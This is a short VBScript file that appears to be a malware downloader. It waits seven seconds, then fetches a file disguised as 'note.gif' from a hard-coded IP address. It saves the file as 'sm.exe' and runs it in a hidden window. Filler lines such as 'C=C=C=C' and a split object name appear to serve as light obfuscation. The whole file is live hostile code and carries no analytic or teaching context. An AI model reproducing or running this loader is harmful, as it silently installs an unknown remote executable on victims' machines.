   Dim BD
   Dim xml
   WScript.Sleep(7000)
   f55 = "HTTP"
   Set xml = CreateObject("Microsoft.XML"+f55)
   xml.Open "GET", "http://209.66.123.109/content/note.gif", False
   xml.Send
   C=C=C=C
   BD = xml.ResponseBody
   C=C=C=C
   Const adTypeBinary = 1
   Const adSaveCreateOverWrite = 2
   C=C=C=C
   Dim BinaryStream
   C=C=C=C
   Set BinaryStream = CreateObject("ADODB.Stream")
   BinaryStream.Type = adTypeBinary
   A=A=A=A
   BinaryStream.Open
   BinaryStream.Write BD
   b=b=b=b
   BinaryStream.SaveToFile "sm.exe", adSaveCreateOverWrite
   Dim WshShell
   Set WshShell = CreateObject("WScript.Shell")
   WshShell.Run "sm.exe", 0, false
